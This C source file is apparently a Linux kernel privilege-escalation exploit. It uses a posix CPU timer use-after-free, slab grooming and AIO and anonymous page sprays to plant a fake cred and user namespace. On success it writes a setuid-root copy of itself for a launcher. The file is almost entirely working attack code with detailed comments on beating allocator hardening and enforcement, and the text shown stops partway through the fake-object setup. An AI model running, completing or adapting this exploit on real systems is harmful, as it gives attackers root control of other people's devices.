#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/sockios.h>
#include <net/if.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <sys/reboot.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#include "ic_compat.h"

/* Raw stderr output for the endgame.  Once the winner's task->cred points
 * at the in-page fake, every libc stdio write goes through the fake sid;
 * under enforcement those writes are denied (fd use against the shell that
 * opened the log) and the text is lost, while a bare write(2) of a marker
 * still lands.  Format with vsnprintf (no stream lock) and hand the bytes
 * to the kernel in one call. */
static void ic_logf(const char *fmt, ...)
{
	char b[256];
	va_list ap;
	int n;

	va_start(ap, fmt);
	n = vsnprintf(b, sizeof(b), fmt, ap);
	va_end(ap);
	if (n <= 0)
		return;
	if (n > (int)sizeof(b))
		n = (int)sizeof(b);
	(void)syscall(SYS_write, 2, b, (size_t)n);
}
#include "ic_timer_target.h"
#include "ic_util.h"
#include "mcast_pats.h"

#define IC_VMA_COUNT 50000UL
#define IC_HELPER_STACK (1UL << 20)
#define IC_RCU_RECLAIM_FILLERS 279
#define IC_RCU_BARN_FILLERS (28 * 10)
#define IC_RCU_RELEASE_RESERVE 540
#define IC_RCU_RELEASE_TIMERS (IC_RCU_BARN_FILLERS + IC_RCU_RELEASE_RESERVE)
#define IC_RCU_DRAIN_KICK 280
#define IC_ORACLE_WORKERS (14 * 28)
#define IC_ORACLE_BATCH 3
#define IC_ORACLE_CANDIDATE_NS (20ULL * 1000 * 1000)
#define IC_ORACLE_RUN_NS (80ULL * 1000 * 1000)
#define IC_STAGE1_FUTURE_NS (250ULL * 1000 * 1000)
#define IC_STAGE2_RUN_NS (1000ULL * 1000 * 1000)
#define IC_AIO_SPRAY_PAGES 16384
#define IC_AIO_SPRAY_USE 16384
#define IC_ANON_SPRAY_PAGES 16384
#define IC_AIO_PREWARM_SMALL 64
#define IC_AIO_PREWARM_LARGE 24
#define IC_SLAB_PADDING_TIMERS_MAX (400 * 28)
#define IC_SLAB_PADDING_TIMERS 4200
/* Timers created after the drain pool and freed right after the padding
 * drop.  Their slabs are all full, so freeing the first object of each one
 * pushes a fresh partial slab onto the per-CPU partial list.  Those pushes
 * overflow cpu_partial_slabs and __unfreeze_partials() then sweeps the
 * slabs that the padding drop left behind - including the empty slab that
 * still holds X - onto the node partial list, where an empty slab is
 * discarded instead of staying frozen on the CPU. */
#define IC_FLUSH_TIMERS (31 * 16)
/* Anti-fragmentation shielding knobs (vendor rsc_mem_antifrag refuses to
 * split Unmovable blocks >= order 5 for order-0 requests, which is what the
 * perf user_page spray issues).  Keep a few slabs around X allocated so the
 * discarded order-1 block cannot coalesce past order 4; the partial-slab
 * overflow that pushes X out of the per-CPU partial list is then supplied by
 * pool timers that sit many slabs away from X.  Defaults reproduce the
 * unshielded chain. */
/* g_pad_skip exempts the newest N padding timers from the keep window and
 * deletes them unconditionally.  Those are the ones that share X's slab
 * (and may sit in the slab right below it, depending on the freelist
 * position at padding time); deleting them is what lets X's slab empty out
 * at the flush delete, while the g_pad_keep ids just below them keep the
 * next-older slab allocated as the lower shield. */
static unsigned int g_pad_keep;
static unsigned int g_pad_skip;
static int g_pad_align;
static unsigned int g_flush_del = IC_FLUSH_TIMERS;
/* Pusher batch: timers allocated before the padding slab, i.e. far below
 * X.  They are all freed right after the reduced flush delete.  At that
 * point X's slab has just emptied, so the pusher frees supply the
 * per-CPU partial-list overflow that discards X's slab, while the slabs
 * above X (the remaining flushers and the kept drain pool) stay
 * allocated and stop the discarded order-1 block from coalescing.  This
 * is the merge-prevention property the full flush+pool free destroys. */
#define IC_PUSHERS_MAX 9000
#define IC_SAFE_FILL_MAX 32768
static unsigned int g_pushers;
static unsigned int g_pusher_count;
static int *g_pusher_ids;
static unsigned int g_flush_sparse;
static unsigned int g_pool_tail_pre;
static unsigned int g_pool_tail_post;
/* IC_SAFE_FILL: posix timers allocated (and kept) between the spray and B's
 * reap, so a spray miss lands on a zeroed k_itimer instead of a free object
 * (see ic_safe_fill()).  Default 0 keeps the historical chain. */
static unsigned int g_safe_fill;
#define IC_PCP_PRIME_PAGES 8192
#define IC_MAX_ATTEMPTS 40
#define IC_DRAIN_POOL_TIMERS (572 * 28)
#define IC_LOCKERS 3
#define IC_PAGE 4096UL

typedef unsigned long ic_aio_context_t;

struct ic_shared_state {
	_Atomic int go;
	_Atomic int locker_started;
	_Atomic int locker_cpu;
	_Atomic int exec_tid;
	_Atomic int target_tgid;
	_Atomic int stop;
	void *base;
	size_t len;
};

struct ic_oracle_worker {
	pthread_t thread;
	unsigned int index;
	_Atomic int ready;
	_Atomic int go;
	_Atomic int done;
	_Atomic int stage2_go;
	_Atomic int stage2_done;
	_Atomic int stop;
	clockid_t clockid;
	timer_t candidate;
	int candidate_created;
	_Atomic int tid;
};

struct ic_timer_oracle {
	struct ic_oracle_worker workers[IC_ORACLE_WORKERS];
	sigset_t signal_set;
	unsigned int thread_count;
};

struct ic_aio_spray {
	ic_aio_context_t contexts[IC_AIO_SPRAY_PAGES];
	unsigned char *pages[IC_ANON_SPRAY_PAGES + IC_AIO_SPRAY_PAGES];
	unsigned char *arena;
	size_t arena_length;
	unsigned char *anon;
	size_t anon_length;
	unsigned int contexts_count;
	unsigned int count;
};

struct ic_release_timers {
	int ids[IC_RCU_RELEASE_TIMERS];
	unsigned int count;
};

static _Atomic int g_stage1_seen;
static _Atomic int g_poc_success;
static _Atomic int g_launch_claimed;
static char g_staging_dir[96];
static char g_helper_path[144];
static int g_helper_fd = -1;
static int g_src_fd = -1;
static int g_launch_wfd = -1;
static _Atomic unsigned int g_output_seq;
static struct ic_shared_state g_state;
static cpu_set_t g_cpu_map;
static unsigned int g_cpu_count;

static long ic_raw_gettid(void)
{
	return syscall(SYS_gettid);
}

static void ic_capture_cpu_map(void)
{
	CPU_ZERO(&g_cpu_map);
	if (sched_getaffinity(0, sizeof(g_cpu_map), &g_cpu_map))
		CPU_ZERO(&g_cpu_map);
	g_cpu_count = (unsigned int)CPU_COUNT(&g_cpu_map);
}

static void ic_pin_cpu_index(unsigned int cpu)
{
	cpu_set_t set;
	unsigned int seen = 0;
	unsigned int i;

	if (!g_cpu_count)
		return;
	CPU_ZERO(&set);
	for (i = 0; i < CPU_SETSIZE; i++) {
		if (!CPU_ISSET(i, &g_cpu_map))
			continue;
		if (seen++ != cpu % g_cpu_count)
			continue;
		CPU_SET(i, &set);
		break;
	}
	(void)sched_setaffinity(0, sizeof(set), &set);
}

static int ic_futex_wait_priv(_Atomic int *word, int expected)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAIT_PRIVATE, expected, NULL,
			    NULL, 0);
}

static void ic_futex_wake_priv(_Atomic int *word, int count)
{
	(void)syscall(SYS_futex, word, FUTEX_WAKE_PRIVATE, count, NULL, NULL, 0);
}

static uint64_t ic_ts_ns(const struct timespec *ts)
{
	return (uint64_t)ts->tv_sec * 1000000000ULL + (uint64_t)ts->tv_nsec;
}

static int ic_is_kernel_pointer(uint64_t v)
{
	return (v & 1UL) == 0 && (v & 0xf000000000000000UL) != 0;
}

static int ic_stage_helper(void)
{
	off_t copied = 0;
	int in;

	if (snprintf(g_helper_path, sizeof(g_helper_path), "%s/.ic-timer-%d",
		     g_staging_dir, (int)getpid()) >= (int)sizeof(g_helper_path))
		return -1;
	(void)unlink(g_helper_path);
	g_helper_fd = open(g_helper_path,
			   O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0700);
	if (g_helper_fd < 0)
		return -1;
	in = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (in < 0)
		goto fail;
	for (;;) {
		ssize_t n = syscall(SYS_sendfile, g_helper_fd, in, NULL, 1 << 20);

		if (n < 0) {
			close(in);
			goto fail;
		}
		if (!n)
			break;
		copied += n;
	}
	close(in);
	if (!copied)
		goto fail;
	/* The scan path execs this file from a child whose fsuid is 0 but
	 * whose uid is not ours, so only the "other" bits matter: it must be
	 * world r-x, and the stored mode must defeat the shell's umask. */
	if (syscall(SYS_fchmod, g_helper_fd, 0755))
		goto fail;

	g_src_fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (g_src_fd < 0)
		goto fail;
	return 0;
fail:
	close(g_helper_fd);
	g_helper_fd = -1;
	(void)unlink(g_helper_path);
	return -1;
}

static int ic_do_escalate(void)
{
	struct stat st;
	char path[176];
	unsigned int seq;
	off_t off = 0, copied = 0;
	int out;

	seq = atomic_fetch_add_explicit(&g_output_seq, 1u, memory_order_relaxed);
	if (snprintf(path, sizeof(path), "%s.%u", g_helper_path, seq) >=
	    (int)sizeof(path))
		return 0;

	out = (int)syscall(SYS_openat, AT_FDCWD, path,
			   O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0700);
	if (out < 0)
		return 0;
	if (syscall(SYS_newfstatat, out, "", &st, AT_EMPTY_PATH) || st.st_uid) {
		(void)syscall(SYS_close, out);
		(void)syscall(SYS_unlinkat, AT_FDCWD, path, 0);
		return 0;
	}
	for (;;) {
		ssize_t n = syscall(SYS_sendfile, out, g_src_fd, &off, 1 << 20);

		if (n < 0) {
			(void)syscall(SYS_close, out);
			(void)syscall(SYS_unlinkat, AT_FDCWD, path, 0);
			return 0;
		}
		if (!n)
			break;
		copied += n;
	}
	if (!copied || syscall(SYS_fchmod, out, 04755)) {
		(void)syscall(SYS_close, out);
		(void)syscall(SYS_unlinkat, AT_FDCWD, path, 0);
		return 0;
	}
	(void)syscall(SYS_close, out);

	/* Hand exactly one copy to the launcher.  Once it execve()s the
	 * helper, the pipe read end may close; a second writer would then
	 * take SIGPIPE, whose default action is exit_group() — that SIGKILLs
	 * every thread of this process, including the winner, sending
	 * release_task() through its bogus cached rb_leftmost. */
	if (atomic_exchange_explicit(&g_launch_claimed, 1,
				     memory_order_acq_rel)) {
		atomic_store_explicit(&g_poc_success, 1,
				      memory_order_release);
		ic_futex_wake_priv(&g_poc_success, 1);
		return 1;
	}
	(void)syscall(SYS_write, g_launch_wfd, path, strlen(path) + 1);
	atomic_store_explicit(&g_poc_success, 1, memory_order_release);
	ic_futex_wake_priv(&g_poc_success, 1);
	return 1;
}

static void ic_warm_splice_pipe(void)
{
	char path[176];
	off_t off = 0;
	int out;

	if (g_src_fd < 0)
		return;
	if (snprintf(path, sizeof(path), "%s.warm", g_helper_path) >=
	    (int)sizeof(path))
		return;
	out = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
	if (out < 0)
		return;
	(void)syscall(SYS_sendfile, out, g_src_fd, &off, 4096);
	close(out);
	(void)unlink(path);
}

static void *ic_oracle_worker_main(void *opaque)
{
	struct ic_oracle_worker *w = opaque;
	struct timespec start, now;

	ic_pin_cpu_index(1 + w->index % 3);
	atomic_store_explicit(&w->tid, (int)syscall(SYS_gettid),
			      memory_order_release);
	atomic_store_explicit(&w->ready, 1, memory_order_release);
	ic_futex_wake_priv(&w->ready, 1);
	while (!atomic_load_explicit(&w->go, memory_order_acquire) &&
	       !atomic_load_explicit(&w->stop, memory_order_acquire))
		(void)ic_futex_wait_priv(&w->go, 0);
	if (atomic_load_explicit(&w->stop, memory_order_acquire))
		return NULL;

	if (clock_gettime(CLOCK_THREAD_CPUTIME_ID, &start))
		exit(105);
	for (;;) {
		for (volatile unsigned int i = 0; i < 4096; i++)
			ic_cpu_relax();
		if (atomic_load_explicit(&g_stage1_seen, memory_order_acquire))
			break;
		if (clock_gettime(CLOCK_THREAD_CPUTIME_ID, &now))
			exit(106);
		if (ic_ts_ns(&now) - ic_ts_ns(&start) >= IC_ORACLE_RUN_NS)
			break;
	}
	atomic_store_explicit(&w->done, 1, memory_order_release);
	ic_futex_wake_priv(&w->done, 1);
	while (!atomic_load_explicit(&w->stage2_go, memory_order_acquire) &&
	       !atomic_load_explicit(&w->stop, memory_order_acquire))
		(void)ic_futex_wait_priv(&w->stage2_go, 0);
	if (atomic_load_explicit(&w->stage2_go, memory_order_acquire)) {
		ic_warm_splice_pipe();
		if (clock_gettime(CLOCK_THREAD_CPUTIME_ID, &start))
			exit(107);
		for (;;) {
			for (volatile unsigned int i = 0; i < 4096; i++)
				ic_cpu_relax();
			if (ic_do_escalate())
				break;
			if (clock_gettime(CLOCK_THREAD_CPUTIME_ID, &now))
				exit(108);
			if (ic_ts_ns(&now) - ic_ts_ns(&start) >=
			    IC_STAGE2_RUN_NS)
				break;
		}
		atomic_store_explicit(&w->stage2_done, 1,
				      memory_order_release);
		ic_futex_wake_priv(&w->stage2_done, 1);
	}
	while (!atomic_load_explicit(&w->stop, memory_order_acquire))
		(void)ic_futex_wait_priv(&w->stop, 0);
	return NULL;
}

static int ic_create_cpu_timer(clockid_t clockid, int tag, uint64_t expires_ns,
			       timer_t *timerid)
{
	struct sigevent ev;
	struct itimerspec setting;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo = IC_SIGEV_SIGNO;
	ev.sigev_value.sival_int = tag;
	if (timer_create(clockid, &ev, timerid))
		return -1;

	memset(&setting, 0, sizeof(setting));
	setting.it_value.tv_sec = (time_t)(expires_ns / 1000000000ULL);
	setting.it_value.tv_nsec = (long)(expires_ns % 1000000000ULL);
	if (timer_settime(*timerid, 0, &setting, NULL)) {
		(void)timer_delete(*timerid);
		return -1;
	}
	return 0;
}

static int ic_setup_timer_oracle(struct ic_timer_oracle *o)
{
	pthread_attr_t attr;
	unsigned int i;

	memset(o, 0, sizeof(*o));
	sigemptyset(&o->signal_set);
	sigaddset(&o->signal_set, IC_SIGEV_SIGNO);
	if (pthread_sigmask(SIG_BLOCK, &o->signal_set, NULL))
		return -1;
	if (pthread_attr_init(&attr))
		return -1;
	if (pthread_attr_setstacksize(&attr, 64 * 1024) ||
	    pthread_attr_setguardsize(&attr, 0)) {
		pthread_attr_destroy(&attr);
		return -1;
	}
	for (i = 0; i < IC_ORACLE_WORKERS; i++) {
		struct ic_oracle_worker *w = &o->workers[i];

		w->index = i;
		if (pthread_create(&w->thread, &attr, ic_oracle_worker_main, w)) {
			pthread_attr_destroy(&attr);
			return -1;
		}
		o->thread_count = i + 1;
		while (!atomic_load_explicit(&w->ready, memory_order_acquire))
			(void)ic_futex_wait_priv(&w->ready, 0);
		if (pthread_getcpuclockid(w->thread, &w->clockid)) {
			pthread_attr_destroy(&attr);
			return -1;
		}
	}
	pthread_attr_destroy(&attr);
	return 0;
}

static int ic_allocate_oracle_candidates(struct ic_timer_oracle *o)
{
	unsigned int i;

	for (i = 0; i < o->thread_count; i++) {
		struct ic_oracle_worker *w = &o->workers[i];

		if (ic_create_cpu_timer(w->clockid, 0x10000 + (int)i,
					IC_ORACLE_CANDIDATE_NS, &w->candidate))
			return -1;
		w->candidate_created = 1;
	}
	return 0;
}

static int ic_delete_oracle_candidates(struct ic_timer_oracle *o)
{
	unsigned int i;

	for (i = 0; i < o->thread_count; i++) {
		struct ic_oracle_worker *w = &o->workers[i];

		if (!w->candidate_created)
			continue;
		if (timer_delete(w->candidate))
			return -1;
		w->candidate_created = 0;
	}
	return 0;
}

static void ic_slab_spray_stat(const char *tag);

/* Set when the reclaim spray only ever maps lone 4K pages (AIO rings, perf
 * pages): the sibling half of the order-1 block is ours in the kernel sense
 * but has no user mapping to write through, so the fake cred's user_ns /
 * ucounts / group_info / user structs must live in a window of the leaked
 * page itself instead of the sibling page. */
static int ic_force_inpage;

static void ic_prepare_aio_page(unsigned char *page)
{
	size_t base;

	memset(page, 0, IC_PAGE);
	for (base = 0; base + SIZEOF_KITIMER <= IC_PAGE; base += 0x108) {
		/* 6.1: it_lock=1 parks the firing loop, SIGEV_NONE avoids
		   wake_up_process(it_process). */
		*(uint32_t *)(page + base + 0x20) = 1;
		*(uint32_t *)(page + base + 0x30) = 1;
		*(uint64_t *)(page + base + 0x54) = 1;
	}
}

static int ic_allocate_aio_spray(struct ic_aio_spray *spray)
{
	size_t ring_bytes = IC_PAGE;
	unsigned int ring_pages = 1;
	unsigned int max_contexts = IC_AIO_SPRAY_USE;
	unsigned int anon_pages = IC_ANON_SPRAY_PAGES;
	long setup_events = 1;
	int no_remap = 0;
	int no_fault = 0;
	const char *env;
	unsigned int i;

	memset(spray, 0, sizeof(*spray));

	env = getenv("IC_AIO_EVENTS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		/* io_setup() rejects nr_events == 0 with -EINVAL (aio-6.1.c:
		 * `if (unlikely(ctx || nr_events == 0)) ret = -EINVAL;`), so
		 * there is no quota-free zero-event context.  The context is
		 * charged max_reqs == nr_events against aio-max-nr; one event
		 * already yields the minimum 1-page ring, and the tiny ring is
		 * the most quota-efficient shape (1 page per 1 quota unit). */
		if (v == 0)
			v = 1;
		if (v <= 1UL << 20)
			setup_events = (long)v;
	}
	no_remap = getenv("IC_AIO_NOREMAP") != NULL;
	/* A multi-page ring cannot be moved into the fixed arena: the arena is
	 * sized before the first io_setup returns ring_bytes.  The ring is
	 * already mapped at ctx->user_id, so use that VA as-is. */
	if (setup_events > 128)
		no_remap = 1;
	/* IC_AIO_NOFAULT: never touch a ring mapping until every context exists.
	 * The buddy hands the freshly discarded posix_timers slab back through
	 * the pcp FIFO, so the *first* order-0 allocations after the drain take
	 * it.  A fault between two ring pages (the detection read or the per-page
	 * pattern write) allocates a page-table page from the same FIFO and eats
	 * one half of that block, which is exactly the half the reap touches.
	 * ring_pages is derived from aio_setup_ring() instead of reading the
	 * header: nr_events += 2, size = sizeof(aio_ring) + sizeof(io_event) *
	 * nr_events, PFN_UP(size), with sizeof(aio_ring) = 32 and
	 * sizeof(io_event) = 32 on arm64. */
	no_fault = getenv("IC_AIO_NOFAULT") != NULL;
	if (no_fault) {
		size_t need = 32 + (size_t)32 * ((size_t)setup_events + 2);

		ring_bytes = (need + IC_PAGE - 1) & ~(size_t)(IC_PAGE - 1);
		ring_pages = (unsigned int)(ring_bytes / IC_PAGE);
		if (ring_pages > 8)	/* AIO_RING_PAGES */
			ring_pages = 8;
		if (ring_pages > 1)
			no_remap = 1;
		if (ring_pages && IC_AIO_SPRAY_USE / ring_pages < max_contexts)
			max_contexts = IC_AIO_SPRAY_USE / ring_pages;
	}

	env = getenv("IC_ANON_PAGES");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v <= IC_ANON_SPRAY_PAGES)
			anon_pages = (unsigned int)v;
	}
	env = getenv("IC_AIO_CTXS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v && v <= IC_AIO_SPRAY_USE)
			max_contexts = (unsigned int)v;
	}
	/* Harness-only: 128-event rings cost 128 of the system-wide
	 * aio_max_nr quota each (ioctx_alloc() has no CAP_SYS_ADMIN
	 * bypass), so a root boot must raise it to spray thousands of
	 * 2-page rings.  Unprivileged app mode cannot do this. */
	env = getenv("IC_AIO_MAXNR");
	if (env && geteuid() == 0) {
		int fd = open("/proc/sys/fs/aio-max-nr", O_WRONLY);

		if (fd >= 0) {
			(void)write(fd, env, strlen(env));
			close(fd);
		}
	}

	spray->anon_length = (size_t)anon_pages * IC_PAGE;
	spray->anon = mmap(NULL, spray->anon_length, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (spray->anon == MAP_FAILED) {
		spray->anon = NULL;
	} else {
		(void)madvise(spray->anon, spray->anon_length, MADV_NOHUGEPAGE);
		for (i = 0; i < anon_pages; i++) {
			unsigned char *page = spray->anon + (size_t)i * IC_PAGE;

			ic_prepare_aio_page(page);
			spray->pages[spray->count++] = page;
		}
	}

	if (!no_remap) {
		spray->arena_length = (size_t)max_contexts * IC_PAGE;
		spray->arena = mmap(NULL, spray->arena_length, PROT_NONE,
				    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (spray->arena == MAP_FAILED)
			spray->arena = NULL;
	}
	for (i = 0; i < max_contexts; i++) {
		ic_aio_context_t context = 0;
		unsigned char *target;
		void *moved;
		unsigned int p;

		if (!no_remap && !spray->arena)
			break;
		if (syscall(SYS_io_setup, setup_events, &context)) {
			if (getenv("IC_ALLOCDBG")) {
				int e = errno;
				char nr[64] = "?", mx[64] = "?";
				int fd = open("/proc/sys/fs/aio-nr", O_RDONLY);

				if (fd >= 0) {
					ssize_t n = read(fd, nr, sizeof(nr) - 1);

					if (n > 0) {
						nr[n] = '\0';
						nr[strcspn(nr, "\n")] = '\0';
					}
					close(fd);
				}
				fd = open("/proc/sys/fs/aio-max-nr", O_RDONLY);
				if (fd >= 0) {
					ssize_t n = read(fd, mx, sizeof(mx) - 1);

					if (n > 0) {
						mx[n] = '\0';
						mx[strcspn(mx, "\n")] = '\0';
					}
					close(fd);
				}
				fprintf(stderr,
					"[ic] aio setup fail i=%u errno=%d aio-nr=%s max=%s\n",
					i, e, nr, mx);
			}
			break;
		}
		if (!(i & 4095))
			fprintf(stderr, "[ic] aio ctx %u\n", i);

		if (!i && !no_fault) {
			const uint32_t *ring =
				(const uint32_t *)(uintptr_t)context;

			if (ring[4] == IC_AIO_RING_MAGIC && ring[1]) {
				size_t need = 32 + (size_t)32 * ring[1];

				if (need > IC_PAGE &&
				    need <= (size_t)8 << 20) {
					ring_bytes = (need + 4095) &
						     ~(size_t)4095;
					ring_pages = (unsigned int)(ring_bytes /
								    IC_PAGE);
					if (IC_AIO_SPRAY_USE / ring_pages <
					    max_contexts)
						max_contexts =
							IC_AIO_SPRAY_USE /
							ring_pages;
				}
			}
		}

		if (!i && getenv("IC_ALLOCDBG"))
			fprintf(stderr,
				"[ic] aio ev=%ld ring_pages=%u max_ctx=%u\n",
				setup_events, ring_pages, max_contexts);

		if (no_remap) {
			target = (unsigned char *)(uintptr_t)context;
		} else {
			target = spray->arena + (size_t)i * ring_bytes;
			moved = mremap((void *)(uintptr_t)context, ring_bytes,
				       ring_bytes,
				       MREMAP_MAYMOVE | MREMAP_FIXED, target);
			if (moved == MAP_FAILED) {
				(void)syscall(SYS_io_destroy, context);
				break;
			}
		}

		spray->contexts[spray->contexts_count++] =
			(ic_aio_context_t)(uintptr_t)target;
		for (p = 0; p < ring_pages; p++) {
			unsigned char *mapped = target + (size_t)p * IC_PAGE;

			if (!no_fault)
				ic_prepare_aio_page(mapped);
			spray->pages[spray->count++] = mapped;
		}
		if (!i && getenv("IC_AIO_PROBE")) {
			/* Exactly the first context's cost.  These opens land
			 * after ctx 0 took or missed the drained block, so they
			 * cannot change which page the ring landed in. */
			ic_slab_spray_stat("post-ctx0");
			fflush(stderr);
		}
	}
	/* Every context maps exactly one 4K ring page, so pages[i]^1 is some
	 * other context's page, not the sibling half of X's block.  Stage 1/2
	 * therefore have to build the fake namespace objects inside X's own
	 * page (ic_peak_zone_off). */
	ic_force_inpage = 1;
	return spray->count >= 512 ? 0 : -1;
}

static void ic_cleanup_aio_spray(struct ic_aio_spray *spray)
{
	unsigned int i;

	for (i = 0; i < spray->contexts_count; i++)
		(void)syscall(SYS_io_destroy, spray->contexts[i]);
	if (spray->arena)
		(void)munmap(spray->arena, spray->arena_length);
	if (spray->anon)
		(void)munmap(spray->anon, spray->anon_length);
	spray->contexts_count = 0;
	spray->count = 0;
	spray->arena = NULL;
	spray->anon = NULL;
}

static int ic_prewarm_aio_allocator(void)
{
	ic_aio_context_t small[IC_AIO_PREWARM_SMALL] = { 0 };
	ic_aio_context_t large[IC_AIO_PREWARM_LARGE] = { 0 };
	struct timespec settle = { .tv_sec = 1 };
	unsigned int made_small = 0, made_large = 0;
	unsigned int i, p;

	for (i = 0; i < IC_AIO_PREWARM_SMALL; i++) {
		if (syscall(SYS_io_setup, 1, &small[i]))
			goto destroy;
		made_small++;
		(void)*(volatile unsigned char *)(uintptr_t)small[i];
	}
	for (i = 0; i < IC_AIO_PREWARM_LARGE; i++) {
		if (syscall(SYS_io_setup, 510, &large[i]))
			goto destroy;
		made_large++;
		for (p = 0; p < 8; p++)
			(void)*(volatile unsigned char *)((uintptr_t)large[i] +
							  (uintptr_t)p * IC_PAGE);
	}

destroy:
	for (i = made_large; i > 0; i--)
		(void)syscall(SYS_io_destroy, large[i - 1]);
	for (i = made_small; i > 0; i--)
		(void)syscall(SYS_io_destroy, small[i - 1]);

	(void)nanosleep(&settle, NULL);
	return 0;
}

static void ic_broadcast_u64(struct ic_aio_spray *spray, size_t offset,
			     uint64_t value)
{
	unsigned int i;

	for (i = 0; i < spray->count; i++)
		*(volatile uint64_t *)(spray->pages[i] + offset) = value;
}

static void ic_broadcast_u32(struct ic_aio_spray *spray, size_t offset,
			     uint32_t value)
{
	unsigned int i;

	for (i = 0; i < spray->count; i++)
		*(volatile uint32_t *)(spray->pages[i] + offset) = value;
}

static void ic_broadcast_u8(struct ic_aio_spray *spray, size_t offset,
			    unsigned char value)
{
	unsigned int i;

	for (i = 0; i < spray->count; i++)
		*(volatile unsigned char *)(spray->pages[i] + offset) = value;
}

static int ic_prepare_stage2(uint64_t task, uint64_t kernel_object,
			     unsigned char *user_object,
			     unsigned char *marker_page, int cross_page,
			     struct ic_aio_spray *spray)
{
	const size_t object_size = IC_OBJECT_SIZE_PLACEHOLDER;
	uint64_t node = kernel_object + OFF_KITIMER_IT_CPU;
	uint64_t head = task + OFF_TASK_CPU_TIMER_HEAD;
	uint64_t cred_slot = task + OFF_TASK_CRED;
	uint64_t kernel_anchor =
		cross_page ? kernel_object + 0x100 : kernel_object;
	unsigned char *user_anchor = cross_page ? marker_page : user_object;
	uint64_t alias_delta = kernel_anchor - (uint64_t)(uintptr_t)user_anchor;
	unsigned char *page, *fake_cred, *fake_timer, *fake_userns;
	unsigned char *security, *label;
	uint64_t fake_cred_addr, fake_timer_node_addr, fake_userns_addr;
	uint64_t fake_security_addr, fake_label_addr;
	size_t layout, object_offset, off;

	if (((uintptr_t)user_anchor & 4095) != (kernel_anchor & 4095))
		return -1;
	page = (unsigned char *)((uintptr_t)user_anchor & ~(uintptr_t)4095);
	object_offset = (size_t)((uintptr_t)user_object & 4095);

	layout = cross_page ? IC_STAGE2_LAYOUT_B :
			      (object_offset >= 0x600 ? IC_STAGE2_LAYOUT_A :
							IC_STAGE2_LAYOUT_C);
	fake_cred = page + layout;
	fake_timer = page + layout + IC_STAGE2_FAKE_TIMER_DELTA;
	fake_userns = page + layout + IC_STAGE2_FAKE_USERNS_DELTA;
	security = page + layout + IC_STAGE2_SECURITY_DELTA;
	label = page + layout + IC_STAGE2_LABEL_DELTA;
	if (label + IC_STAGE2_LABEL_SIZE > page + IC_PAGE ||
	    (!cross_page &&
	     !((label + IC_STAGE2_LABEL_SIZE <= user_object) ||
	       (user_object + object_size <= fake_cred))))
		return -1;

	fake_cred_addr = (uint64_t)(uintptr_t)fake_cred + alias_delta;
	fake_timer_node_addr =
		(uint64_t)(uintptr_t)(fake_timer + OFF_KITIMER_IT_CPU) +
		alias_delta;
	fake_userns_addr = (uint64_t)(uintptr_t)fake_userns + alias_delta;
	fake_security_addr = (uint64_t)(uintptr_t)security + alias_delta;
	fake_label_addr = (uint64_t)(uintptr_t)label + alias_delta;
	if (!ic_is_kernel_pointer(fake_cred_addr) ||
	    !ic_is_kernel_pointer(fake_timer_node_addr) ||
	    !ic_is_kernel_pointer(fake_userns_addr))
		return -1;

	memset(fake_cred, 0, IC_STAGE2_CRED_SIZE);
	memset(fake_timer, 0, object_size);
	memset(fake_userns, 0, IC_STAGE2_USERNS_SIZE);
	memset(security, 0, IC_STAGE2_SECURITY_SIZE);
	memset(label, 0, IC_STAGE2_LABEL_SIZE);

	*(uint64_t *)(fake_cred + 0x00) = fake_timer_node_addr;
	*(uint64_t *)(fake_cred + 0x08) = node;
	*(uint64_t *)(fake_cred + 0x10) = 0;
	for (off = 0x28; off <= 0x48; off += 8)
		*(uint64_t *)(fake_cred + off) = UINT64_MAX;
	*(uint64_t *)(fake_cred + 0x78) = 0;
	*(uint64_t *)(fake_cred + 0x88) = fake_userns_addr;

	*(uint32_t *)(fake_userns + 0x00) = 1;   /* uid_map.nr_extents */
	*(uint32_t *)(fake_userns + 0x08) = 0;   /* extent.first */
	*(uint32_t *)(fake_userns + 0x0c) = 0;   /* lower_first */
	*(uint32_t *)(fake_userns + 0x10) = 1;   /* count */
	*(uint32_t *)(fake_userns + 0x48) = 1;   /* gid_map.nr_extents */
	*(uint32_t *)(fake_userns + 0x50) = 0;
	*(uint32_t *)(fake_userns + 0x54) = 0;
	*(uint32_t *)(fake_userns + 0x58) = 1;
	*(uint64_t *)(fake_userns + 0xd8) = 0;   /* parent */
	*(uint32_t *)(fake_userns + 0xe0) = 0;   /* level */
	*(uint32_t *)(fake_userns + 0xe4) = 0;   /* owner */
	*(uint32_t *)(fake_userns + 0xe8) = 0;   /* group */
	*(uint32_t *)(fake_userns + 0x100) = 0;  /* ns.inum */


	(void)security; (void)label;

	*(uint32_t *)(fake_timer + 0x20) = 1;   /* it_lock */
	*(uint32_t *)(fake_timer + 0x30) = 1;   /* it_clock */
	*(uint32_t *)(fake_timer + 0x40) = 0;
	*(uint64_t *)(fake_timer + 0x54) = 1;   /* SIGEV_NONE */
	*(uint64_t *)(fake_timer + OFF_KITIMER_IT_CPU) = 0;
	*(uint64_t *)(fake_timer + OFF_KITIMER_IT_CPU + 8) = 0;
	*(uint64_t *)(fake_timer + OFF_KITIMER_IT_CPU + 0x10) =
		fake_cred_addr + 4;
